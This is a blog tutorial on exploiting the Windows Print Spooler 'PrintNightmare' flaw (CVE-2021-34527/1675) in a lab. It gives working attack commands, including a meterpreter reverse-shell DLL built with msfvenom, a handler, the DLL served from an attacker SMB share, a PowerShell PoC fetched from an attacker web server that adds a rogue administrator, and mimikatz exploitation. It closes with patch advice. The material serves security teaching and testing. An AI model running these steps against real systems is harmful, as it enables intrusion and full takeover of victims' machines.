<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Windows Privilege Escalation: PrintNightmare</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-privilege-escalation-printnightmare/" rel="bookmark"><time class="entry-date published" datetime="2022-02-19T18:33:08+00:00">February 19, 2022</time><time class="updated" datetime="2025-05-10T20:27:32+00:00">May 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Print Spooler has been on researcher’s radar ever since Stuxnet worm used print spooler’s privilege escalation vulnerability to spread through the network in nuclear enrichment centrifuges of Iran and infected more than 45000 networks. PrintNightmare is the common name given to a Remote Code Execution vulnerability in the Print Spooler service (spoolsv.exe) in Microsoft Windows Operating Systems. The vulnerability was assigned CVE-2021-34527. </span></p>
<p><span style="color: #000000;">Initially, it was thought of as a Local Privilege Escalation (LPE) and assigned CVE-2021-1675. Immediate patches for the LPE were released in June 2021 and was marked low severity. About 2 weeks later, Microsoft changed the low severity status of LPE to severe as it was found that patches were bypassed and Remote Code Execution achieved CVE-2021-34527 assigned. There was a controversy after a misunderstanding between the authors and Microsoft where the RCE exploit got released on GitHub before the patches, making it a 0-day vulnerability. However, it was immediately rolled back. In this article, we will be focusing on Privilege Escalation using this Print Spooler vulnerability. The traction it got in 2021 made it vulnerability of the year.</span></p>
<p><span style="color: #000000;"><strong>Related CVEs: </strong></span></p>
<p><span style="color: #000000;"><strong><a style="color: #000000;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527">CVE-2021-34527</a></strong></span></p>
<p><span style="color: #000000;"><strong>Vulnerability Type</strong>     Remote Code Execution</span></p>
<p><span style="color: #000000;"><strong>Severity               </strong>          High</span></p>
<p><span style="color: #000000;"><strong>Base CVSS Score</strong>        9.3</span></p>
<p><span style="color: #000000;"><strong>Versions Affected</strong>       Windows_10:20h2, Windows_10:21h1, Windows_10:1607,</span></p>
<p><span style="color: #000000;">Windows_10:1809, Windows_10:1909, Windows_10:2004,</span></p>
<p><span style="color: #000000;">Windows_7sp1, Windows_8.1, Windows_rt_8.1,</span></p>
<p><span style="color: #000000;">Windows_Server_2008, Windows_Server_2008,</span></p>
<p><span style="color: #000000;">Windows_Server_2012, Windows_Server_2012:r2,</span></p>
<p><span style="color: #000000;">Windows_Server_2016, Windows_Server_2016:20h2,</span></p>
<p><span style="color: #000000;">Windows_Server_2016:2004, Windows_Server_2019</span></p>
<p><span style="color: #000000;"><strong><a style="color: #000000;" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-1675">CVE-2021-1675</a></strong></span></p>
<p><span style="color: #000000;"><strong>Vulnerability Type</strong>     Local Privilege Escalation</span></p>
<p><span style="color: #000000;"><strong>Severity               </strong>          High</span></p>
<p><span style="color: #000000;"><strong>Base CVSS Score</strong>        9.3</span></p>
<p><span style="color: #000000;"><strong>Versions Affected</strong>       Windows_10:20h2, Windows_10:21h1, Windows_10:1607,</span></p>
<p><span style="color: #000000;">Windows_10:1809, Windows_10:1909, Windows_10:2004,</span></p>
<p><span style="color: #000000;">Windows_7sp1, Windows_8.1, Windows_rt_8.1,</span></p>
<p><span style="color: #000000;">Windows_Server_2008, Windows_Server_2008,</span></p>
<p><span style="color: #000000;">Windows_Server_2012, Windows_Server_2012:r2,</span></p>
<p><span style="color: #000000;">Windows_Server_2016, Windows_Server_2016:20h2,</span></p>
<p><span style="color: #000000;">Windows_Server_2016:2004, Windows_Server_2019</span></p>
<p><span style="color: #000000;">Related Advisories:</span></p>
<ul>
<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a></strong></span></li>
<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-34527">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-34527</a></strong></span></li>
<li><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675</a></strong></span></li>
</ul>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Print Spooler Basics</strong></span></li>
<li><span style="color: #000000;"><strong>Vulnerability Summary</strong></span></li>
<li><span style="color: #000000;"><strong>Vulnerability Flow</strong></span></li>
<li><span style="color: #000000;"><strong>Machine IPs</strong></span></li>
<li><span style="color: #000000;"><strong>Method 1 – PrintNightmare RCE using Python</strong></span></li>
<li><span style="color: #000000;"><strong>Method 2 – PrintNightmare LPE using Powershell</strong></span></li>
<li><span style="color: #000000;"><strong>Method 3 – Printnightmare LPE using Mimikatz</strong></span></li>
<li><span style="color: #000000;"><strong>Patch Status</strong></span></li>
<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3><span style="color: #800000;">Print Spooler Basics</span></h3>
<p><span style="color: #000000;">Print spooler is the primary printing process interface. It is a built-in EXE file that is loaded at system startup itself. The workflow of a printing process is as <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/print/introduction-to-spooler-components">follows</a></strong></span>:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgKK9SRwPXWdtJgPhf5s-QXJvGPeLuG0FaKQG4Pkd4xlMlzDpVW1k4e8KcFndBQ6aeV4In8oKdo_MZxVzbixWr1OBuvLvmGqCUXYa5I-Xc1np20mMwFCJVFs0WA1DCxk9ltFmkJFfnDJow9VOjYVEx6LEOoiabT1tnDt_nz9RGy8QZs-Nl7SrgmL6i9dg=s16000"/></span></p>
<p><span style="color: #000000;"><strong>Application</strong>: The print application creates a print job by calling Graphics Device Interface (GDI).</span></p>
<p><span style="color: #000000;"><strong>GDI</strong>: GDI includes both user-mode and kernel-mode components for graphics support.</span></p>
<p><span style="color: #000000;"><strong>winspool.drv</strong> is the interface that talks to the spooler. It provides the RPC stubs required to access the server.</span></p>
<p><span style="color: #000000;"><strong>spoolsv.exe</strong> is the spooler’s API server. This module implements message routing to print provider with the help of router (spoolss.dll)</span></p>
<p><span style="color: #000000;"><strong>spoolss.dll</strong> determines which print provider to call, based on a printer name and passes function call to the correct provider.</span></p>
<h3><span style="color: #800000;">Vulnerability Summary</span></h3>
<p><span style="color: #000000;">MS-RPRN protocol (Print System Remote Protocol) has a method RpcAddPrinterDriverEx() which allows remote driver installation by users with the SeLoadDriverPrivilege right. This right is only with users in Administrator group. So, the exploit tries to bypass this authentication in RpcAddPrinterDriver. Technique given by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/afwu">afwu</a></strong></span>.</span></p>
<p><span style="color: #000000;"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/cube0x0">Cube0x0</a> </strong></span>tweeted that he was able to achieve the same results by exploiting MS-PAR protocol’s RpcAsyncAddPrinterDriver() method which is similar to RpcAddPrinterDriver and loads drivers remotely. Technique can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/cube0x0/CVE-2021-1675">here</a></strong></span>.</span></p>
<p><span style="color: #000000;">We will use both these techniques in this demonstration article.</span></p>
<h3><span style="color: #800000;">Vulnerability Flow</span></h3>
<p><span style="color: #000000;">To understand the vulnerability flow, lets understand working of RpcAddPrinterDriver first. The steps are as follows:</span></p>
<ul>
<li><span style="color: #000000;">Add a Printer Driver to a Server call (RpcAddPrinterDriver)</span></li>
<li><span style="color: #000000;">Client (Attacker) creates a share with printer driver files accessible</span></li>
<li><span style="color: #000000;">Client (attacker) crafts an MS-RPRN (Print System Remote Protocol) Driver container which has DRIVER_INFO_2 in it. (basically, these are variables that contain path of DLLs, type of architecture etc.)</span></li>
<li><span style="color: #000000;">Client (Attacker) calls:</span><br/>
<span style="color: #000000;">RpcAddPrinterDriver(“&lt;name of print server&gt;”, DriverContainer);</span></li>
</ul>
<h5><span style="color: #000000;"><strong>Security Check: </strong></span></h5>
<p><span style="color: #000000;">When the client will call this function, system checks if the client has “SeLoadDriverPrivilege” which is by default given to administrators group.</span></p>
<h5><span style="color: #000000;"><strong>Bypassing Security Check: </strong></span></h5>
<p><span style="color: #000000;">AFWU mentioned in his original writeup that a user can supply the following parameters in the spooler service:</span></p>
<ul>
<li><span style="color: #000000;"><strong>​ pDataFile =A.dll</strong></span></li>
<li><span style="color: #000000;"><strong>​ pConfigFile =B.dll</strong></span></li>
<li><span style="color: #000000;"><strong>​ pDriverPath=C.dll</strong></span></li>
</ul>
<p><span style="color: #000000;">Spooler service will copy A,B,C DLL files in <strong>C:\Windows\System32\spool\drivers\x64\3\new</strong> and then load them to <strong>C:\Windows\System32\spool\drivers\x64\3</strong></span></p>
<p><span style="color: #000000;">He further elaborates that for pDataFile and pDriverPath there is a check in Windows that these DLLs can’t be a <a style="color: #000000;" href="https://www3.trustwave.com/support/kb/KnowledgebaseArticle10870.aspx#:~:text=UNC%20is%20short%20for%20Universal,or%20a%20longer%20directory%20path.">UNC path</a>. But pConfigFile can be a UNC path and therefore an attacker can do the following:</span></p>
<ul>
<li><span style="color: #000000;"><strong>​ pDataFile =A.dll</strong></span></li>
<li><span style="color: #000000;"><strong>​ pConfigFile =\\attacker_share\evil.dll</strong></span></li>
<li><span style="color: #000000;"><strong>​ pDriverPath=C.dll</strong></span></li>
</ul>
<p><span style="color: #000000;">Which in theory would force Windows to load evil.dll from an attacker’s share.</span></p>
<p><span style="color: #000000;">Thus, the authentication bypass happens as follows:</span></p>
<ul>
<li><span style="color: #000000;">RpcAddPrinterDriver is called with suggested parameters and a UNC path leading to malicious DLL</span></li>
<li><span style="color: #000000;">Malicious DLL is copied in <strong>C:\Windows\System32\spool\drivers\x64\3\evil.dll</strong></span></li>
<li><span style="color: #000000;">But this raises an access conflict so, we invoke Driver backup function and copy old drivers (including our malicious DLL) to the directory <strong>C:\Windows\System32\spool\drivers\x64\3\old\1\</strong></span></li>
<li><span style="color: #000000;">Replace pConfigFile path to DLL to this <strong>C:\Windows\System32\spool\drivers\x64\3\old\1\evil.dll </strong>path</span></li>
<li><span style="color: #000000;">Access restriction is now bypassed and DLL loaded into spoolsv.exe successfully</span></li>
</ul>
<p><span style="color: #000000;">This was elaborated in his writeup on Github which was removed. However, if you start your engines and travel your “wayback” into the time, you might be able to find it <a style="color: #000000;" href="http://web.archive.org/web/20210630054520/https://github.com/afwu/PrintNightmare">here</a> 🙂</span></p>
<p><span style="color: #000000;">And the above stated process is the fundamental mechanism behind the working of exploits we will see in this article.</span></p>
<h3><span style="color: #800000;">Machine IPs</span></h3>
<p><span style="color: #000000;">Throughout the demo, following IP addresses have been taken:</span></p>
<p><span style="color: #000000;"><strong>Attacker IP: 192.168.1.2</strong></span></p>
<p><span style="color: #000000;"><strong>Victim IP: 192.168.1.190</strong></span></p>
<p><span style="color: #000000;"><strong>Compromised Credentials used: ignite/123</strong></span></p>
<h3><span style="color: #800000;">Method 1 – PrintNightmare RCE using Python</span></h3>
<p><span style="color: #000000;">This is the method pertaining to CVE-2021-34527 (remote code execution as admin). You can find Cube0x0’s official PoC <a style="color: #000000;" href="https://github.com/cube0x0/CVE-2021-1675">here</a>. We will be using a forked version here.</span></p>
<p><span style="color: #000000;">First, we need to create a malicious DLL file which would run as ADMINISTRATOR. We use msfvenom for this.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 -f dll -o evil.dll</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhuPKz1-qkbiH6YyS4YRq1sD7zWPg-ZnDz_n1Ryo4n7LkufoWoodkoYzm-RW8Ub9JG40lNsWTbUBGNZ7h43xjkCVI6PRMSrkKscjs2ulg64-W4dDW5Am4NdSuHoZEdsQD-7EYIfcZoDFw-LkBSZ06PUjnRmhv2qvQIBCeUgjqoMBRivPWXvme-F7viOUA=s16000"/></span></p>
<p><span style="color: #000000;">Now, we can check if the target is vulnerable or not using metasploit’s auxiliary module. Here, I have entered a random path for DLL_PATH argument as I am not running the exploit, I just have to scan. In our testing, we found Metasploit’s printnightmare to be unreliable and hence, we are not showing this technique here. You can test it on your own and see if it works for you though. This run confirmed that victim is vulnerable to printnightmare.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
set RHOSTS 192.168.1.190
set SMBUser ignite
set SMBPass 123
set DLL_PATH /
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEglBTn-7Q406EupEG4rqdccohxaMM0taLtCcXX9Po0rGiAMpm7HwuHGPRsd8LPYPWb2iHCp_tuZG8toHlIyWPg1Xz-LPDph7vleOT01kFAuLQuQEbQtYYAKeGsp-utOY8a3ZoQRZag3Sq6QxjZpbOvj96HTPkxzziu7N8O7j52BidybdgsB17MOjlZzHg=s16000"/></span></p>
<p><span style="color: #000000;">We now start a handler beforehand prior to executing our DLL file using the exploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.2
set LPORT 4444
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjvPWljeXZmeJEaqnmMAsaePtns1u2DeIen1YqrHn-kdJtXCHqE6EvFYeGSwqiSY7xg9nnKIypPRi2HbiowP7YnqZa_VwDNIdCVnlluxngjqDRNBBAwSK5mPACQibk05M745hPGDg9Sur6-DTrUvJVPi_RhHiCQipAuXRd4vf-cKdRFRl3-4BkqgYgQhw=s16000"/></span></p>
<p><span style="color: #000000;">Now, we need to clone the github repo. We are using a forked version of Cube0x0’s original exploit.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
cd PrintNightmare-CVE-2021-34527
chmod 777 CVE-2021-34527.py</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhpxbZHqM3IylJSg07ByT9OInKzXK7VUHbqDQ-pIQNrjJ7HKiq6KVo0jve9tE-8u1Raw18sZM4l6i7C0bKhUbraV2wrRgBzEmBR_hcTvoY73Qy61wQ_4l286v4OEAskw6YoFLuLQuWmV77of4w5YXazdYKCZVNlYCF0lFAmj4ZEv9oaoRoqPdMcnv8oYg=s16000"/></strong></span></p>
<p><span style="color: #000000;">Alright, one last step remaining is to host the malicious DLL in our SAMBA server. You can set up a samba server manually in Kali, use Windows host to host this or the easier approach is to use impacket’s smbserver.</span></p>
<p><span style="color: #000000;">Add the share name you want (in my case, “share” is used) and then supply the path (in my case, /root) where you have saved the malicious DLL.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /root</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhkRc_vf28ZdA73Tu3A8KMTQdOlBxV6DJ4tI-v-Epix0kXjIVjwHLbDD7aRu0BvYXs33W9vwHThm5S5jmUCT2qh2h01sedwZaIAcgsUoRY-j9SeQsDzjpay713OC_YyZX3OdcJ2UR-K8uRz_HYiPFXWB_dUsYmOKSar4blOBh56eyTLZFopy9-Oem3Lkg=s16000"/></span></p>
<p><span style="color: #000000;">With everything prepped up and ready, we can launch the RCE exploit. The execution is simple</span></p>
<p><span style="color: #000000;">./exploit.py credentials@IP ‘UNC_PATH of DLL hosted’</span></p>
<p><span style="color: #000000;">Here, we just launched a share on impacket, we will use that as the UNC path</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./CVE-2021-34527.py ignite:123@192.168.1.190 '\\192.168.1.2\share\evil.dll'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiLMxAIFHYoDfNFX1Q7hFTX_xewYLi1t8X-ubA7a5mo1OEO8dDkslQVBkL6ue4IYfKYRgTwGZgmBv9NmO8_JyGtPUl1ra5rfsGppXNLy70jypzjqPsAEvajHthVKQ304TkGS53XxhHkhwa3lUSf8yomPpaRW99v7s4DFTV-kZK_5NTUMJBbCYYZHVXxUA=s16000"/></span></p>
<p><span style="color: #000000;">As you can see, the victim has successfully executed our DLL file and returned us an administrator level session on the victim!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi-cJsoLFCiHhF_mINWMNCwEV-YUSjEGKu_GBfjXsLHyAnzcrQogResom4p7PLFa8zf2xOPyU10IW6SzlkjShspncLP4ln4wP67-WSlSnkfjJ67KUz6YGWjOxrgwjR0CZZtuLS0Lb1XTbSAIMv1ezEWWec4XXSRTXEuCOokJy6wJv8F7QT6-xXW10m5fw=s16000"/></span></p>
<h3><span style="color: #800000;">Method 2 – PrintNightmare LPE using Powershell</span></h3>
<p><span style="color: #000000;">We have seen the remote exploit pertaining to CVE 2021-34527. Now, we will see the older local privilege escalation exploit. AFWU had implemented the original exploit in C plus plus while Caleb Stewart and John Hammond created a working PoC in powershell. Unlike the traditional exploit, this version doesn’t need an attacker to create SMB server in order to exploit. Instead of a remote UNC path injection, authors create a standalone DLL in temp directory and do a local UNC path injection.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/calebstewart/CVE-2021-1675.git
cd CVE-2021-1675 &amp;&amp; ls -al</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEioSYbe6pbkGih4ZUifWqFdyzeiMeaOByoi6UxaY1rYpMd-Cl25S3av86e5GqOsBg7QqegONtaIzAnkPy9JGnAeKeX2jHcqkmmKLbJRjFSA34EdOC3rmt-0G-XPjEtqE19Lb7l0AdV0kgxlBiOAe64zjyHg1ZQ38ccDB1MpeJ89gmmS3kLLImaxgxTc6Q=s16000"/></span></p>
<p><span style="color: #000000;">Now, once the victim is compromised, we can upload this ps1 file in \Users\Public directory using IWR and setting up a python http server in the CVE-2021-1675 directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd CVE-2021-1675
python3 -m http.server 80
powershell wget http://192.168.1.2/CVE-2021-1675.ps1 -O \Users\Public\cve.ps1
cd C:\Users\Public
dir</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhV5QX_bfm1HwRTOt7-bbOEh4acNDeHiLp_mWoZXllcQaBEJgPwv5T4Z1b7XSIcG3ep9FMEZsNAfzjH47LQwg2K9_0H1lsYRhZpHw7u_p3U9LOhy87LSPGlH68kYoELn6EnPkOp7SRsweQFAjeZGvYvz4dTs4abBpB7B3yvZEWR0jeLrQG4DYfb5Kcg-w=s16000"/></span></p>
<p><span style="color: #000000;">Now, we can execute this ps1 file using powershell. This powershell script will help us in adding a new user in the administrator group using the credentials specified. For that, we need to spawn interactive powershell and Invoke the module like so:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
Import-Module .\cve.ps1
Invoke-Nightmare -NewUser "harsh" -NewPassword "123" -DriverName "PrintMe"</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiMmenFoAuIRtWOt1XV3NPSMyjB_EeKHQW71ycKwtDxuRzCbezsomgzDP1R94z71PIWxMFQc_3ASWzbG_uvlCOqpivVmXj6l8x_Edpg92Qz8KVm203ho0-NcF7TWjmRYSta14levAffd6xUTTXJ2Z0rcaYg3TSknkcLAyLdeGlIxCU7HrLazhl5kWdTcA=s16000"/></strong></span></p>
<p><span style="color: #000000;">As you can see, the script has made a custom DLL that adds a new user “harsh” with password 123 in admin group and the script has exploited print spool.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">net localgroup administrator</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjm476TN7H3YlvqxDa1dYq4BrUhJUHeUM6B7XA05xAhW9XD3aE0yLp9N4Kphis7HZy_mMiO0GazkeL6sRW8vXJm1smajhy1UJwKOhfpIYKwffUrVISRkd7-e7DdOmuktmfeWYDcY4wigV3HDWXtxrUHN1x6BaC3DwQ-yFRfZyJjC7HG3N7TbYjoCFKYTw=s16000"/></span></p>
<p><span style="color: #000000;">We can confirm this by logging in to the victim using psexec.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 psexec.py harsh:123@192.168.1.190</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhXwS2ULWBm-dVWr2ZZ3fMPCZ3mtvMXMV7a7QNievbmtA0uuvGiuDwjnNBKSSdSaEsT45xbtNXUq6QAmuzftzuPcTny1CGqzUmRYjtmw_tz9EeKiKWe_mk0bn9nyn_XJwTlYM_unfZp6jQtDCQiqz6B0Gym7uUDmolyB3My1fSKoiwLRzCtiZv7HqC3tA=s16000"/></span></p>
<p><span style="color: #000000;">We are able to log in with the credentials and can confirm using net user command that harsh is infact a member of administrators now.</span></p>
<h3><span style="color: #800000;">Method 3 – Printnightmare LPE using Mimikatz</span></h3>
<p><span style="color: #000000;">When the PoC came on the internet, a new mimikatz plugin got added as a ritual in the misc section (misc::printnightmare). To exploit using mimikatz, we will use our existing DLL file “evil.dll” and also, we need our SMBserver running on the existing configuration. Now, we will download mimikatz.exe on our kali and start python HTTP server.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python3 -m http.server 80
powershell wget http://192.168.1.2/mimikatz.exe -O \users\Public\mimikatz.exe
misc::printnightmare /library:\\192.168.1.2\share\evil.dll /authuser:ignite /authpassword:123 /try:50</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjbPSehsyW5w9-_styKI9fjXjcQxml03A699x7Tvx4YipBMDT7pMyQREXWO81mhpDscJx50ZNFPgXa7lr08Rqxq1aOIpFFUubIAb3-xuhKE_q2kQ-jI8i6_NVEn25Bxe_-E38iiqygysu5p4qKMBTIFT2SnrVpgbGcRmkIHgK0bJhrlpV1E7RkDsSRFcw=s16000"/></span></p>
<p><span style="color: #000000;">As mimikatz has confirmed the execution has been successful. It throws an exception (probably because of some characters in the DLL) but the DLL has worked anyway and a reverse shell has been received on multi/handler.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj6yzSnwBZy4M3Cxais8__2qdWrLRnohzaf0NvIni5rdqA4cLYNA4W5MzUtE1sx0_pRvvoxn7PUFH8EQMCrb0DXjnxN7lk797FjBg91YrAD4no7xhXRX_PadTQjUo6qp8QW193t6Rh79vebv1FTDKv68lyjf5_3WjtuEeQEWg-AbldS7P_DJ2YbtPuMyw=s16000"/></span></p>
<p><span style="color: #000000;">Make sure to set up a handler on Metasploit before running this command. If everything goes right, you shall see a reverse shell!</span></p>
<p><span style="color: #000000;">And thus, we have conducted privilege escalation by exploiting PrintNightmare vulnerability.</span></p>
<h3><span style="color: #800000;">Patch Status</span></h3>
<p><span style="color: #000000;">Microsoft released out of band patches to deal with this vulnerability which can be found on the MSRC bulletin advisory mentioned in the introduction. Furthermore, system admins should consider disabling point and print functionality and disabling printing on users where it is not necessary.</span></p>
<h3><span style="color: #800000;">Conclusion</span></h3>
<p><span style="color: #000000;">Due to the nature of this vulnerability and ease of exploitation, PrintNightmare is a severe vulnerability that got a de-facto vulnerability of the year award in 2021. Many newer exploits have arised since then that target spoolsv.exe and despite all the efforts by Microsoft, patches are getting bypassed and so, it is highly recommended that analysts stay aware of upcoming threats to Print Spooler and keep their monitoring definitions updated. Hope you liked the article. Thanks for reading.</span></p>
<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <span style="color: #0000ff;"><a class="broken_link" style="color: #0000ff;" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></span></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
